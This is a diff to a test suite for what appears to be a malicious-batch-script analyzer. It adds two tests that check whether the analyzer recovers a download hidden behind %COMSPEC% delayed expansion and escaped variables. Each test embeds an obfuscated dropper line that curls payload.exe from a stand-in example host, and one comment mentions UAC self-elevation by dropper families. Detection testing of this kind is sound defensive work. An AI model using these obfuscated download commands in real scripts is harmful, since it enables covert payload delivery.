@@ -1577,6 +1577,25 @@ start payload.chm"#;
     }
 
     #[test]
+    fn start_comspec_child_preserves_escaped_delayed_expansion() {
+        let script = br#"setlocal EnableDelayedExpansion
+start "" /b %COMSPEC% /V:ON /c "set U=https://start-escaped.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://start-escaped.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "start escaped COMSPEC child did not preserve delayed expansion: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn start_process_verb_runas_emits_self_elevation_trait() {
         // `Start-Process … -Verb RunAs` triggers UAC. Dropper families
         // (SKMBT, dropper.bat) use it to relaunch elevated. Surface as
@@ -8467,6 +8486,25 @@ mod call_wrapper_tests {
             )),
             "call cmd child did not preserve delayed expansion: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn call_comspec_child_preserves_escaped_delayed_expansion() {
+        let script = br#"setlocal EnableDelayedExpansion
+call %COMSPEC% /V:ON /c "set U=https://call-escaped.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://call-escaped.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "call escaped COMSPEC child did not preserve delayed expansion: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
         );
     }
 }
